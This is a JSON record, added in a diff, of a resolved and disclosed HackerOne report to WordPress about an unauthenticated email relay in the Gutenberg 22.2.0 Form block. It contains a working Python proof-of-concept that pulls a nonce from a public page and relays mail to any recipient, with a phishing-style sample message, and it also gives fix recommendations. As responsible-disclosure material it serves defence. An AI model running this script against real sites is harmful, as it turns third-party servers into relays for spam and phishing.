@@ -1,0 +1,116 @@
+{
+  "id": 3460138,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNDYwMTM4",
+  "url": "https://hackerone.com/reports/3460138",
+  "title": "Open Email Relay on WordPress Gutenberg Plugin via formAction parameter leads to phishing and spam campaigns",
+  "state": "Closed",
+  "substate": "resolved",
+  "readable_substate": "Resolved",
+  "created_at": "2025-12-10T00:10:56.195Z",
+  "submitted_at": "2025-12-10T00:10:56.253Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "zadwon",
+    "url": "/zadwon",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 55,
+    "url": "https://hackerone.com/wordpress",
+    "handle": "wordpress",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/055/f114d1d31f904e3b903cd99a6cf566bb531f8401_original.jpg/33193aed4df168c753cb4b15e6d5d8d6ba053ba5ee3e8d1478c137162601abe9",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/055/f114d1d31f904e3b903cd99a6cf566bb531f8401_original.jpg/e68529859b080f77ebfd9e0a1acafdf062bd4c43f1db58e7e55c81e6ceae2d0d"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "WordPress",
+      "twitter_handle": "wordpress",
+      "website": "https://wordpress.org/",
+      "about": "Beautiful sites of any kind."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": true,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2026-11-08T18:15:49.159Z",
+  "bug_reporter_agreed_on_going_public_at": "2026-10-09T18:15:43.675Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Description:\n\nThe Gutenberg plugin version 22.2.0 contains an experimental Form block (`core/form`) that exposes an unauthenticated AJAX endpoint allowing arbitrary attackers to relay emails through the WordPress site to any recipient. This vulnerability enables attackers to use the WordPress site as an open relay for spam/phishing campaigns, potentially damaging email reputation and facilitating targeted phishing attacks.\n\nThe vulnerability exists because:\n\n1. The form view script embeds sensitive parameters (`nonce`, `ajaxUrl`, `action`) in a publicly accessible script tag\n2. The AJAX handler `wp_block_form_email_submit` is registered for both authenticated (`wp_ajax_*`) and **unauthenticated** (`wp_ajax_nopriv_*`) requests\n3. The handler trusts the client-supplied `formAction` parameter without validation\n4. No rate limiting or sender verification is enforced\n\n## Asset Identification\n\n**Asset Type:** Source Code\n**Asset Name:** WordPress Gutenberg Plugin\n**Asset URL:** https://github.com/WordPress/gutenberg\n**Version:** 22.2.0\n\n**Vulnerable Files:**\n1. `packages/block-library/src/form/index.php` - [Server-side form handler](https://github.com/WordPress/gutenberg/blob/trunk/packages/block-library/src/form/index.php)\n2. `lib/experimental/blocks.php` - [Nonce/credentials exposure](https://github.com/WordPress/gutenberg/blob/trunk/lib/experimental/blocks.php)\n\n**Vulnerable Endpoint:**\n- AJAX action: `wp_block_form_email_submit`\n- Handler function: `gutenberg_block_core_form_send_email()`\n- Registration: `wp_ajax_nopriv_wp_block_form_email_submit` (unauthenticated)\n\n\n## Technical Details\n\n**Vulnerable Component:** `build/scripts/block-library/form.php` and `lib/experimental/blocks.php`\n\n**Root Cause:**\n```php\n// In build/scripts/block-library/form.php (lines 103-104):\nadd_action( 'wp_ajax_wp_block_form_email_submit', 'gutenberg_block_core_form_send_email' );\nadd_action( 'wp_ajax_nopriv_wp_block_form_email_submit', 'gutenberg_block_core_form_send_email' );\n```\n\nThe `nopriv` registration allows unauthenticated requests. The handler extracts `formAction` from POST data and uses it directly:\n\n```php\n// Line 92-96:\n$result = wp_mail(\n    str_replace( 'mailto:', '', $params['formAction'] ),\n    __( 'Form submission' ),\n    $content\n);\n```\n\n**Data Exposure:**\nThe form view script module (`lib/experimental/blocks.php` lines 129-131) injects credentials into the page:\n\n```php\n$data['nonce']   = wp_create_nonce( 'wp-block-form' );\n$data['ajaxUrl'] = admin_url( 'admin-ajax.php' );\n$data['action']  = 'wp_block_form_email_submit';\n```\n\nThese appear in the HTML as:\n```html\n<script type=\"application/json\" id=\"wp-script-module-data-@wordpress/block-library/form/view\">\n{\"nonce\":\"abc123...\",\"ajaxUrl\":\"http://site/wp-admin/admin-ajax.php\",\"action\":\"wp_block_form_email_submit\"}\n</script>\n```\n\n## Steps To Reproduce:\n\n### Prerequisites\n- WordPress site with Gutenberg 22.2.0 plugin installed\n- Form block enabled (Admin → Gutenberg → Experiments → \"Blocks: add Form and input blocks\")\n- At least one public page/post containing a Form block\n- Python 3.10+ with `requests` library (`pip install requests`)\n\n### Setup (for demonstration)\n\n1. **Start MailHog** (for email capture in testing environment):\n```bash\ndocker run -d -p 1025:1025 -p 8025:8025 mailhog/mailhog\n```\n\n2. **Enable Form Block** in WordPress:\n   - Navigate to: Admin Dashboard → Gutenberg → Experiments\n   - Enable: \"Blocks: add Form and input blocks\"\n   - Click \"Save Changes\"\n\n3. **Configure Mail Transport** (for demo only):\n   - Install WP Mail SMTP plugin\n   - Configure SMTP: host `127.0.0.1`, port `1025`, no authentication\n   - This routes all mail to MailHog for observation\n\n### Exploitation Script\n\nSave as `poc_form_relay.py`:\n\n```python\n\"\"\"\nPoC: Unauthenticated email relay via Gutenberg Form block\nGutenberg plugin 22.2.0 - CVE-TBD\n\"\"\"\nimport argparse\nimport json\nimport re\nimport sys\nfrom urllib.parse import urljoin\nimport requests\n\nSCRIPT_ID = \"wp-script-module-data-@wordpress/block-library/form/view\"\n\ndef extract_settings(html):\n    \"\"\"Extract nonce/action/ajaxUrl from the public script tag\"\"\"\n    match = re.search(\n        rf'id=\"{re.escape(SCRIPT_ID)}\"\\s*>\\s*(?P<data>{{.*?}})\\s*</script>',\n        html, re.S\n    )\n    if not match:\n        return None\n    try:\n        return json.loads(match.group(\"data\"))\n    except json.JSONDecodeError:\n        return None\n\ndef parse_kv_pairs(pairs):\n    \"\"\"Parse key=value field arguments\"\"\"\n    parsed = {}\n    for item in pairs:\n        if \"=\" not in item:\n            raise ValueError(f\"Invalid field '{item}', expected key=value\")\n        key, value = item.split(\"=\", 1)\n        parsed[key.strip()] = value\n    return parsed\n\ndef main():\n    parser = argparse.ArgumentParser(\n        description=\"Gutenberg Form unauthenticated mail relay PoC\"\n    )\n    parser.add_argument(\"--page\", required=True, \n                       help=\"Page URL containing the Gutenberg form\")\n    parser.add_argument(\"--to\", required=True,\n                       help=\"Target email address\")\n    parser.add_argument(\"--field\", action=\"append\", default=[],\n                       help=\"Field key=value (repeatable)\")\n    parser.add_argument(\"--insecure\", action=\"store_true\",\n                       help=\"Disable TLS verification\")\n    args = parser.parse_args()\n\n    fields = parse_kv_pairs(args.field) if args.field else {\"message\": \"Test\"}\n    \n    session = requests.Session()\n    \n    print(\"[+] Fetching target page to extract credentials...\")\n    resp = session.get(args.page, timeout=15, verify=not args.insecure)\n    if not resp.ok:\n        print(f\"[!] Failed to fetch page: {resp.status_code}\")\n        sys.exit(1)\n\n    settings = extract_settings(resp.text)\n    if not settings:\n        print(\"[!] Could not locate form settings in page HTML\")\n        sys.exit(1)\n\n    ajax_url = urljoin(args.page, settings.get(\"ajaxUrl\", \"\"))\n    print(f\"[+] Extracted AJAX endpoint: {ajax_url}\")\n    print(f\"[+] Extracted nonce: {settings.get('nonce', 'N/A')}\")\n    \n    payload = {\n        \"_ajax_nonce\": settings.get(\"nonce\", \"\"),\n        \"action\": settings.get(\"action\", \"wp_block_form_email_submit\"),\n        \"_wp_http_referer\": args.page,\n        \"formAction\": f\"mailto:{args.to}\",\n    }\n    payload.update(fields)\n    \n    print(f\"[+] Sending malicious form submission to {args.to}...\")\n    post_resp = session.post(ajax_url, data=payload, timeout=15,\n                            verify=not args.insecure)\n    \n    print(f\"[+] Response Status: {post_resp.status_code}\")\n    try:\n        result = post_resp.json()\n        print(f\"[+] Response: {result}\")\n        if result.get(\"success\"):\n            print(\"[✓] Email successfully relayed!\")\n    except ValueError:\n        print(f\"[!] Response text: {post_resp.text[:500]}\")\n\nif __name__ == \"__main__\":\n    main()\n```\n\n### Execution\n\n```bash\npython3 poc_form_relay.py \\\n    --page http://wordpress.local/contact-us/ \\\n    --to victim@example.com \\\n    --field message=\"Urgent: Verify your account\" \\\n    --field subject=\"Security Alert\"\n```\n\n## Recommendations\n\n1. **Immediate Mitigation**:\n   - Disable the experimental Form block: Admin → Gutenberg → Experiments → uncheck \"Blocks: add Form and input blocks\"\n   - Monitor mail logs for suspicious activity\n\n2. **Proper Fix** (for plugin maintainers):\n   - Remove `nopriv` registration: Only allow authenticated users to submit forms\n   - Validate `formAction`: Implement server-side allowlist for recipient addresses\n   - Add rate limiting: Implement per-IP throttling on form submissions\n   - Add CAPTCHA: Require human verification for form submissions\n   - Remove credential exposure: Don't embed nonce in public script tags; generate nonce on form load via separate authenticated endpoint",
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 5100933,
+      "file_name": "PoC-Form-Relay-Spam.webm",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/no939dzj3m95mpkrnuzlot7b323q?response-content-disposition=attachment%3B%20filename%3D%22PoC-Form-Relay-Spam.webm%22%3B%20filename%2A%3DUTF-8%27%27PoC-Form-Relay-Spam.webm&response-content-type=video%2Fwebm&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ7DKWJ3CZ%2F20261108%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20261108T205712Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEEwaCXVzLXdlc3QtMiJGMEQCIGOusIMhWmIdUN12fIPe7JeXbCLSydp%2FMTqqgDl%2BHgJaAiBYUS1H9fikaUFs%2B8jUUbRTRTFv0Ko05rHr90ppzNKWySqyBQgVEAMaDDAxMzYxOTI3NDg0OSIMfEP5j2kMQ9gPF08jKo8F%2BgtcpFnVyqbq3%2FndLx5nKQ1BV%2FVzZIF6X1S4A6bV9DxAHMtCV4QUiSVgjwXSJgDWAo4C9jO%2BnQk3h47c7UbrR7JT5Dk7GfPPmzb9JZ0DglgYB100V2KxhOtdB24LKmk2GYl3GgoMq5Cd8138%2Fc1v4NSZaJRyWr6iX8CRLfbKE1cv0I2VjDYAwLzeTprg%2B9dpd%2BUUoeKIi9Y4RA47A3M9MJvSPxPVQ5dzY17wwbC8WnuVtBJYGK6H6lcph%2BL5YAHBAxs0Cil7s%2FPG1eZKi4o8Q6cHwK358elG8G6Rx5AFPsr8FZsGCcZJhtsK5Rv%2BG3WcKIjfscpiTcriVDWib2aOC6Ft4wlZgEnQ3RYxQ7PL9gsJgie8kt181%2BV3n3ue99UXznW3Ev8cxrkmqUw8e4XGeHr69%2BL%2FKBIA7GY0yTAGCFhcH%2Bhq5LYh5cyIPfs3fq7v0pUA8cy762ClyPaEMRyVmIPBoKw%2BjN%2BDDSE5CMPFU8yZMWLIZIPNJou84ptBDmOqfeXAvmEx%2Bja4IEM3I47gVLUGLQ1T97ywjAXelpr4I%2FRf%2BpLqHKBasq44h%2Fw2uVzLSrAvYqLos1w5dnfQjvaU4atOUh7Rc8VyrKHT%2FaBG3LN6BKkgwTCPNUMmCGalP2a3NO7zQdodq50039f9JwyjojvVkpGICRwxwQ%2Bk9oXzf8eDStWnNGG6AiIlbwOMD7VvDqNFaXXuBeZPiVtcm93s9eDXc93wdP19Ckfg8MTPuIxygE1Ki3c0XAd7eAUYEDkIUrUmHj79uAc5i2fRGqZQrujUXpP%2F9M6gPPxgK%2FNGpG1uI%2BeiuQR7mIf6VhWBP%2BxtGBlO5PoYHNbQ0CpRKSM%2B3BWhbzshWuuMpqpGFaSSPjDWpMPXBjqyAXEOksxHvN1VoX63XZH7bUJgODUfbGrS3%2FXhKbr%2BL7mgDIZvMez9TDAVJ9NTpcNnfp8kMAKZejH2CwaLfMlSQxcYZHmTUBEWtlCnCiag3Q3O0lkMedKHHei0sboiwrg0AywESdmLfubttgujdWZXAwypAduJstrEMxn3uCnvUXulyysduBnhz9qEM81YVFc%2BRUuh2ch2tUIYR3aMUc8UZ8KN8ZQlVZn8RX5Y6MW%2Fm8o6fpw%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=1f07bc7bce7eebce137a26fd689edafedf32ea7a13fc3f5d4b6037f79f13b267",
+      "file_size": 6657352,
+      "type": "video/webm",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2026-11-08T18:15:43.854Z",
+  "allow_singular_disclosure_after": -9688.78674281,
+  "singular_disclosure_allowed": true,
+  "vote_count": 1,
+  "voters": [
+    "2026"
+  ],
+  "structured_scope": {
+    "databaseId": 5545,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "Gutenberg",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": [],
+    "can_view_ave_report?": false
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
